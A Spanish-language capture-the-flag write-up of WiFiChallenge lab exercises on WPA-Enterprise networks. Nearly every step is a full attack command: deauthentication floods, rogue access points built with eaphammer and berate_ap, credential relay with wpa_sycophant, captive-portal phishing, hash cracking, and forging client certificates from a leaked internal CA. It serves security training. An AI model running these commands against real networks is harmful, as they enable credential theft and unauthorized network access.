# Challenges MGT

En este capítulo vamos a realizar los siguientes retos:

* Challenge 18 - ¿Cuál es la contraseña de Juan en wifi-corp?
* Challenge 19 - ¿Cuál es la contraseña de CONTOSO\test en wifi-corp?
* Challenge 20 - ¿Cuál es el usuario (con dominio) con contraseña 12345678 en wifi-corp?
* Challenge 21 - ¿Cuál es la flag en el AP wifi-regional-tablets?
* Challenge 22 - ¿Cuál es la flag en el AP wifi-regional?
* Challenge 23 - ¿Cuál es la contraseña del usuario vulnerable a RogueAP de wifi-global?
* Challenge 24 - ¿Cuál es la flag después de iniciar sesión en wifi-regional con las credenciales obtenidas en el paso anterior?
* Challenge 25 - ¿Cuál es la contraseña del Administrador de wifi-corp?
* Challenge 26 - ¿Cuál es la flag encontrada en el AP wifi-global?

***

## Challenge 18

* ¿Cuál es la contraseña de Juan en wifi-corp?

Para atacar una red MGT, hay que crear un AP falso, para esto hay que crear un certificado TLS para el AP usando `eaphammer`

Primero escaneamos la red en busca de "wifi-corp" y despues escaneando esta especifcamente

```
airodump-ng wlan0 --band bag -c 44 --bssid F0:9F:C2:71:22:1A -w /home/user/wifi/MGT/wifi-corp
```

<figure><img src="../../../.gitbook/assets/image (317).png" alt=""><figcaption></figcaption></figure>

> En este caso no hay ningun cliente conectado a la wifi de esta empresa, asi que se la haremos a otra wifi suya que si tenga clientes, en este caso "wifi-global"

```
airodump-ng wlan0 --band bag -c 44 --bssid F0:9F:C2:71:22:17 -w /home/user/wifi/MGT/wifi-global
```

<figure><img src="../../../.gitbook/assets/image (318).png" alt=""><figcaption></figcaption></figure>

Ahora para sacar la info del certf de sesion de esta wifi, utilizamos `pcapFilter` -->

```
bash /root/tools/pcapFilter.sh -C -f /home/user/wifi/MGT/wifi-global-01.cap
```

<figure><img src="../../../.gitbook/assets/image (319).png" alt=""><figcaption></figcaption></figure>

Ahora para general el certificado usamos `eaphammer` -->

```
python3 /root/tools/eaphammer/eaphammer --cert-wizard
```

<figure><img src="../../../.gitbook/assets/image (320).png" alt=""><figcaption></figcaption></figure>

Esto nos ira pidiendo información que deberemos ir cogiendo de la información del certificado sacado con `pcapFilter`&#x20;

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (15) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```
mv "WiFiChallenge CA-1.pem" /home/user/wifi/MGT/
```

<figure><img src="../../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

> Esto sirve por si un usuario mira el certificado del AP, veo los campos en texto, no es obligatorio para el lab pero si recomendable en la vida real

Ahora que tenemos el certificado, levantamos el punto de acceso con `eaphammer`

```
python3 /root/tools/eaphammer/eaphammer -i wlan3 --auth wpa-eap --essid wifi-corp
```

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Una vez que este el falso AP levantado, volvemos a monitorizar con `airodump-ng` el canal correspondiente (el 44) -->

```
airodump-ng wlan0 -c44
```

<figure><img src="../../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Vemos que wifi-corp tiene dos APs y hay otro mas, que es el nuestro (el que termina en `44:00`, el rojo)

Para realizar el ataque, necesitamos hacer un `ataque de des autentificación` a ambos clientes, ejecutando `aireplay-ng`

```
## Cliente 6C:40 - Red 1
aireplay-ng -0 0 -a F0:9F:C2:71:22:1A -c 64:32:A8:07:6C:40 wlan0
## Cliente 6C:40 - Red 2
aireplay-ng -0 0 -a F0:9F:C2:71:22:15 -c 64:32:A8:07:6C:40 wlan0
```

> `-a` : BSSID del AP
>
> `-c` : MAC del cliente

<mark style="background-color:yellow;">Se lo tiramos al mismo cliente en ambas redes, para que asi, cuando se desconecte de una e intente ir a la otra que conoce, tambien se desconecte y por ultimo, vaya hacia la nuestra</mark>

<figure><img src="../../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Vemos que el cliente se conecta y desconecta (ya que no tenemos su contraseña y no podemos continuar con la autentificación) pero tenemos un hash en `mschapv2`

Ahora lo guardamos en un archivo y utilizamos hashcat para romperlo -->

```
## Creamo fichero hash
nano juan.hash
## Content
juan.tr::::e85353c383224cb95be75727ad5f86bf9486335aa76b9070:8c1fe46f72a842f1
```

<figure><img src="../../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Rompemos con `hashcat` -->

```
/root/tools/hashcat-6.0.0/hashcat.bin -a 0 -m 5500 juan.hash /root/rockyou-top100000.txt --force
```

> `mschapv2` es un cifrado duro y sera muy lento el crakeo

<figure><img src="../../../.gitbook/assets/image (10) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

> Ahora en el caso de que cerremos la terminal y perdamos el hash, podemos volver a verlo en `/root/tools/eaphammer/logs/` (archivo `hostapd-eaphammer.log`)

Teniendo su contraseña en texto claro, nos conectamos con `wpa_supplicant` y pedir IP con `dhclietnt`

<pre class="language-bash"><code class="lang-bash">## Creamos el fichero
nano juan-corp.conf
## Content
<strong>network={
</strong><strong>        ssid="wifi-corp"
</strong><strong>        scan_ssid=1
</strong><strong>        key_mgmt=WPA-EAP
</strong><strong>        eap=PEAP
</strong><strong>        anonymous_identity="CONTOSO\anonymous"
</strong><strong>        identity="CONTOSO\juan.tr"
</strong><strong>        password="bulldogs1234"
</strong><strong>        phase1="peapver=1"
</strong><strong>        phase2="auth=MSCHAPV2"
</strong><strong>}
</strong><strong>## Conectamos wpa_supplicant
</strong><strong>wpa_supplicant -i wlan1 -c juan-corp.conf
</strong><strong>## Pedimos IP
</strong><strong>dhclient -v wlan1
</strong></code></pre>

<figure><img src="../../../.gitbook/assets/image (11) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Y ahora apuntamos dede el navegador a la puerta de enlace `6.1`

<figure><img src="../../../.gitbook/assets/image (12) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Tenemos credenciales -->

`CONTOSO\juan.jr:bulldogs1234`

<figure><img src="../../../.gitbook/assets/image (13) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

***

## Challenge 19&#x20;

* ¿Cuál es la contraseña de CONTOSO\test en wifi-corp?

Para este ataque tenemos que usar fuerza bruta con `air-hammer`, creando un fichero con el nombre del usuario y ejecutando -->

```
## Añadimos el user
echo 'CONTOSO\test' > test.user
## Attack
/root/tools/air-hammer/air-hammer.py -i wlan1 -e wifi-corp -p /root/rockyou-top100000.txt -u test.user
```

> `-i` : Interfaz en SIN modo monitor
>
> `-e` : nombre del AP
>
> `-p` : diccionario
>
> `-u` : user name / domain

<figure><img src="../../../.gitbook/assets/image (14) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Tenemos la contraseña del usuario test del dominio, asi que nos conectamos con `wpa_supplicant`

```bash
## Creamos el fichero
nano test-corp.conf
## Content
network={
        ssid="wifi-corp"
        scan_ssid=1
        key_mgmt=WPA-EAP
        eap=PEAP
        anonymous_identity="CONTOSO\anonymous"
        identity="CONTOSO\test"
        password="monkey"
        phase1="peapver=1"
        phase2="auth=MSCHAPV2"
}
## Conectamos wpa_supplicant
wpa_supplicant -i wlan1 -c test-corp.conf
## Pedimos IP
dhclient -v wlan1
```

<figure><img src="../../../.gitbook/assets/image (15) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (16) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

***

## Challenge 20

* ¿Cuál es el usuario (con dominio) con contraseña 12345678 en wifi-corp?

Es muy parecido al anterior, solo que en vez de una lista de contraseñas, es un diccionario de usuarios

```
cat /root/top-usernames-shortlist.txt
```

<figure><img src="../../../.gitbook/assets/image (17) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Tambien sabiendo que estamos en el domino `CONTOSO,` debemos añadir el prefijo delante de los usuarios -->

```
cat /root/top-usernames-shortlist.txt | awk '{print "CONTOSO\\" $1}' > /home/user/wifi/MGT/top-users-CONTOSO.txt
```

<figure><img src="../../../.gitbook/assets/image (18) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Ahora utilizamos de nuevo `air-hammer` con la contraseña que nos han dado y este fichero -->

```
/root/tools/air-hammer/air-hammer.py -i wlan1 -e wifi-corp -P 12345678 -u /home/user/wifi/MGT/top-users-CONTOSO.txt 
```

<figure><img src="../../../.gitbook/assets/image (19) (1) (1).png" alt=""><figcaption></figcaption></figure>

Y teniendo el usuario y contraseña, volvemos a conectarnos a la red -->

```
## Creamos el fichero
nano ftp-corp.conf
## Content
network={
        ssid="wifi-corp"
        scan_ssid=1
        key_mgmt=WPA-EAP
        eap=PEAP
        anonymous_identity="CONTOSO\anonymous"
        identity="CONTOSO\ftp"
        password="12345678"
        phase1="peapver=1"
        phase2="auth=MSCHAPV2"
}
## Conectamos wpa_supplicant
wpa_supplicant -i wlan1 -c ftp-corp.conf
## Pedimos IP
dhclient -v wlan1
```

<figure><img src="../../../.gitbook/assets/image (20) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (21) (1) (1).png" alt=""><figcaption></figcaption></figure>

***

## Challenge 21

* ¿Cuál es la flag en el AP wifi-regional-tablets?

Vamos a tener que crear un punto de acceso AP falso, asi que lo primero que vamos a hacer es cambiarnos nuestra MAC -->

```
macchanger -m F0:9F:C2:00:00:00 wlan1
```

<figure><img src="../../../.gitbook/assets/image (16) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

> Utilizaremos el wlan1

Ahora debemos usar `wpa_sycophant`, muy parecido a `wpa_supplicant`, para este hay que modificar el archvio `wpa_sycophant_example.conf`

```
nano /root/tools/wpa_sycophant/wpa_sycophant_example.conf
```

Debemos modificar dos lineas, la de `ssid` y la de `blacklist_bssid` == Una es poner el nombre de la wifi a falsear y el otro es poner nuestra MAC para no conectarnos nosotros mismos

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```
network={
  ssid="wifi-regional-tablets"
  # The SSID you would like to relay and authenticate against. 
  scan_ssid=1
  key_mgmt=WPA-EAP
  # Do not modify
  identity=""
  anonymous_identity=""
  password=""
  # This initialises the variables for me.
  # -------------
  eap=PEAP
  # Read https://w1.fi/cgit/hostap/plain/wpa_supplicant/wpa_supplicant.conf for help with phase1 options. 
  # This attempts to force the client not use cryptobinding. 
  phase1="peapver=1"
  phase2="auth=MSCHAPV2"
  # Dont want to connect back to ourselves,
  # so add your rogue BSSID here.
  bssid_blacklist=f0:9f:c2:00:00:00
}
```

Ahora para hacer el ataque necesitamos abrir varias ventanas

1. En una de ellas, levantamos el AP falso con `berate_ap` (ya que este esta peparado para comunicarse directamente con `sycophant`)

```
/root/tools/berate_ap/berate_ap --eap --mana-wpe --wpa-sycophant --mana-credout outputMana.log wlan1 lo wifi-regional-tablets
```

> Nos pide una configuracion manual o que la dejemos por defecto (lo mejor siempre es manual ya que tenemos la info del certf del AP origin sacada en el reto 18)

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

2. Una vez que esta montado ejecutamos `wpa_sycophant` en la otra ventana

```
./wpa_sycophant.sh -c wpa_sycophant_example.conf -i wlan3
```

3. En la tercera pestaña, para hacer el ataque de des autentificación al cliente conectado a la red, lo vemos con airodump-ng -->

```
airodump-ng wlan0 -c 44 --bssid F0:9F:C2:7A:33:28
```

<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Vemos dos clientes, asi que ahora hacemos el ataque de des, contra uno de ellos

```
aireplay-ng -0 0 wlan0 -a F0:9F:C2:7A:33:28 -c 64:32:A8:A9:DE:55
```

<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Ahora en wpa\_sycophant vemos como se conecta y tambien dando su hash -->

<figure><img src="../../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Y tambien como nos conectamos auto a la red -->

<figure><img src="../../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Ahora pedimo ip con `dhclient`

```
dhclient wlan3 -v
```

<figure><img src="../../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Ahora podemos apuntar desde el navegador a la puerta de enlace y coger la flag

<figure><img src="../../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

***

## Challenge 22

* ¿Cuál es la flag en el AP wifi-regional?

Para esto, vamos a hacer casi lo mismo que el reto anterior

Asi que tenemos que modificar el fichero `wpa_sycophant_example.conf`, modificando la primera linea que es la el nombre del AP -->

<figure><img src="../../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Y ejecutamos directamente el `wpa_sycophant`

```
./wpa_sycophant.sh -c wpa_sycophant_example.conf -i wlan3
```

En otra terminal, nos levantamos el `berate_ap` (exactamente igual que antes) soloq eu con wifi-regional ahora -->

```
/root/tools/berate_ap/berate_ap --eap --mana-wpe --wpa-sycophant --mana-credout outputMana.log wlan1 lo wifi-regional
```

Ahora escaneamos su red con aerodump-ng para sacar la info del BSSID y de los clientes -->

```
airodump-ng wlan0 -c 44 --bssid F0:9F:C2:71:22:16
```

<figure><img src="../../../.gitbook/assets/image (10) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Y ahora (cuando el AP falso esta levantado) lanzamos con `aireplay-ng` el ataque des autentificación

```
aireplay-ng wlan0 -0 0 -a F0:9F:C2:71:22:16 -c 64:32:A8:AC:53:50
```

> Si hay algun problema en la ejecucion, reiniciar todo y levantar de nuevo el modo monitor

Al ejecutarlo vemos como el berate\_ap nos da un erro de CA

<figure><img src="../../../.gitbook/assets/image (11) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Esto significa que este ataque no funcionara contra este AP porque el cliente verifica la CA, asi que nunca se nos va a conectar

<mark style="background-color:yellow;">Tenemos que buscar otra forma para atacar este tipo de red</mark>

<mark style="background-color:yellow;">Muchas veces, als empresas con diferentes redes suelen estar conectadas el mismo directorio activo por detrás, y por grupo y/o users, se configura quien puede acceder a ciertas redes</mark>

Podemo levantar un AP falso con wifi-regional-tables (como en el challenge anterior) manteniendo el wpa\_sycopham a la red wifi-regional. Asi que un cliente se nos conecta al AP falso de wifi-regional-tables y reenviamos sus credenciales a wifi-regional

Levanatamos el AP de wifi-regional-tables

```
/root/tools/berate_ap/berate_ap --eap --mana-wpe --wpa-sycophant --mana-credout outputMana.log wlan1 lo wifi-regional-tablets
```

Manemos el wpa\_sycophant a la wifi-regional original -->

```
./wpa_sycophant.sh -c wpa_sycophant_example.conf -i wlan3
```

Y por ultimo el ataque des autentificaon se hace contra un cliente de wiif-regiona-tables (como en el challenges anterior)(reuitlizo ese comando) -->

```
aireplay-ng -0 0 wlan0 -a F0:9F:C2:7A:33:28 -c 64:32:A8:A9:DE:55
```

Con esto conseguimos que un cliente de wifi-regional-tablets se conecte a nuestro  AP falso y su credenciales son reenviadas a wifi\_regional, conectándonos asi automáticamente

<figure><img src="../../../.gitbook/assets/image (12) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Pedimos ip con `dhclient` y apuntamos conel navegador directamente a la puerta de enlace -->

<figure><img src="../../../.gitbook/assets/image (13) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (14) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

***

## Challenge 23

* ¿Cuál es la contraseña del usuario vulnerable a RogueAP de wifi-global?

Como hemos visto antes "wifi-global" solo soporta autentifacion con certificados, asi que no podemos atacar directamente esa comunicacion, pero viendo mas información usando wifi\_db podemos ver sus probes

Esto lo podemos ver, escaneando el trafico de la wifi con `airodump-ng` y guardando en un bbdd con `wifi_db` -->

```
airodump-ng wlan0 --band bag -c 44 --bssid F0:9F:C2:71:22:17 -w /home/user/wifi/MGT/wifi-globa
```

<figure><img src="../../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```
python3 /root/tools/wifi_db/wifi_db.py -d wifi-global.db /home/user/wifi/MGT/
```

```
sqlitebrowser wifi-global.db
```

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Todo apunta a que "Wifi-Restaurant" y "open-wifi" son wifis abiertas y "home-WiFi" una PSK

Ahora levantamos un AP falso como "WiFi-Restaurant" (sin ningun tipo de conf porque es una OPN) y hacemos la desconexión del AP real con el AP legitimo, de este modo el cliente se nos conecta a nuestro AP falso y desde un portal cautivo, le pedimos user and password y se las robamos -->

```
./eaphammer --essid WiFi-Restaurant --interface wlan4 --captive-portal
```

Y buscamos la informacion de cliente para hacerle el ataque de desautentificacion, en este caso, lo habiamos sacado con airodump-ng en la captura de arriba

```
aireplay-ng wlan0 -0 0 -a F0:9F:C2:71:22:17 -c 64:32:A8:BC:53:51
```

Al lanzar el ataque, vemos como el cliente se conecta y nos lanza un credenciales contra el portal cautivo, consigueindo asi su user and passw -->

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Ahora, este ataque podemos hacerlo igual pero en vez de con un portal cautivo (`--captive-portal`) con un portal hostil (--`hostile-portal`)

```
./eaphammer --essid WiFi-Restaurant --interface wlan4 --hostile-portal
```

Y al lanzarle el ataque de desautentificacion, se conecta y nos da su hash NTMLv2 -->

<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Con este hash, podemos rompelo con hashcar -->

```
hashcat -a 0 -m 5600 hash.5600 /rockyou.txt --force
```

***

## Challenge 24

* ¿Cuál es la flag después de iniciar sesión en wifi-regional con las credenciales obtenidas en el paso anterior?

Nos conectamos usando wpa-supllicant -->

```
## Creamos fichero
regi-god.conf
## Confg
network={
        ssid="wifi-regional"
        scan_ssid=1
        key_mgmt=WPA-EAP
        eap=PEAP
        anonymous_identity="CONTOSOREG\anonymous"
        identity="CORPO\god"
        password="tommy1"
        phase1="peapver=1"
        phase2="auth=MSCHAPV2"
}
## Nos conectamos
wpa_supplicant -i wlan3 -c regi-god.conf
## Pedimos IP
dhclient wlan3 -v
```

<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Apuntamos desde la web a la puerta de enlace 7.1 -->

<figure><img src="../../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Y iniciamos session con las cerds obtenidas -->

<figure><img src="../../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

***

## Challenge 25&#x20;

* ¿Cuál es la contraseña del Administrador de wifi-corp?

En el ejercicio 18 hemos visto dos clientes de "wifi-corp", uno era Juan y otro era un usuario que verificaba la CA. Ahora que tenemos la clave privada de la CA y un certificado del servidor, podemos levantar un AP falso con ese certificado -->

> Al acceder en el ejercio 24, vimos carios ficheros descargables dentro de la 7.1

<figure><img src="../../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Me los descargo todos desde `wget`

```
wget -A txt -m -p -E -l -np http://192.168.7.1/.internalCA/
```

Ahora utilizamos `eaphammer` para levantar el AP falso con los certificados -->

```
python3 ./eaphammer --cert-wizard import --server-cert /home/user/Downloads/server.crt --ca-cert /home/user/Downloads/ca.crt --private-key /home/user/Downloads/server.key --private-key-passwd whatever
```

<figure><img src="../../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Ya nos ha generado el certificado y ahora podemo hacer el ataque de des autentifacion como en el reto 18, pero al otro cliente que nos pide el CA -->

```
python3 ./eaphammer -i wlan4 --auth wpa-eap --essid wifi-corp
```

Una vez levantado el AP falso, miramos la MAC del cliente y le hacemos el ataque de des atentificacion en AMBOS APs, ya que si solo lo hacemos de uno, se conecta al otro y no al nuestro

```
## AP 1
aireplay-ng -0 0 -a F0:9F:C2:71:22:1A wlan0 -c 64:32:A8:BA:6C:41
## AP 2
aireplay-ng -0 0 -a F0:9F:C2:71:22:15 wlan0 -c 64:32:A8:BA:6C:41
```

Tras ejecutar ambos, vemos como se conecta a nuestro AP, le damos el CA y nos da su password, obteniendo asi el user y pass del  Admin-->

<figure><img src="../../../.gitbook/assets/image (10) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Ahora generamos el fichero de conexion con wpa\_supplicant y pedimos IP -->

```bash
## Creamos fichero
admin-corp.conf
## Confg
network={
    ssid="wifi-corp"
    scan_ssid=1
    key_mgmt=WPA-EAP
    eap=PEAP
    anonymous_identity="CONTOSO\anonymous"
    identity="CONTOSO\Administrator"
    password="SuperSecure@!@"
    # phase1="peapver=1"
    phase2="auth=GTC"
}
## Nos conectamos
wpa_supplicant -i wlan3 -c admin-corp.conf
## Pedimos IP
dhclient wlan3 -v
```

<figure><img src="../../../.gitbook/assets/image (11) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (12) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

***

## Challenge 26

* ¿Cuál es la flag encontrada en el AP wifi-global?

Una vez que tenemos toda la información del reto 24, podemos ir a los ficheros que nos descargamos y vemos uno de configuracion de un cliente, con esto y la CA podemos generar un certificado de cliente

Lo primero, generar una clave privada con OpenSSL -->

```
openssl genrsa -out /home/user/Downloads/client.key 2048
```

Despues generamos un solicitud de firma del certifcado con el fichero de conf que nos hemos descargado antes -->

```
openssl req -config /home/user/Downloads/client.conf -new -key /home/user/Downloads/client.key -out /home/user/Downloads/client.csr
```

> Pulsamos muchas veces intro para dejarlo por defecto

<figure><img src="../../../.gitbook/assets/image (13) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Por utlimo firmamos el certificado con la CA que nos hemos descargado -->

```
openssl x509 -days 730 -extfile client.ext -CA ca.crt -CAkey ca.key -CAserial ca.serial -in client.csr -req -out client.crt
```

<figure><img src="../../../.gitbook/assets/image (14) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Ahora tenemos un `client.crt` y un `client.key`, con esto no generamos un fichero de wpa\_supplicant

<pre><code>## Create
nano wpa_tls.conf
## Conf
<strong>network={
</strong> ssid="wifi-global"
 scan_ssid=1
 mode=0
 proto=RSN
 key_mgmt=WPA-EAP
 auth_alg=OPEN
 eap=TLS
    #anonymous_identity="GLOBAL\anonymous"
 identity="GLOBAL\GlobalAdmin"
 ca_cert="./ca.crt"
 client_cert="./client.crt"
 private_key="./client.key"
 private_key_passwd="whatever"
}
## Connect
wpa_supplicant -i wlan4 -c wpa_tls.conf
## CALL IP
dhclient wlan4 -v
</code></pre>

<figure><img src="../../../.gitbook/assets/image (15) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
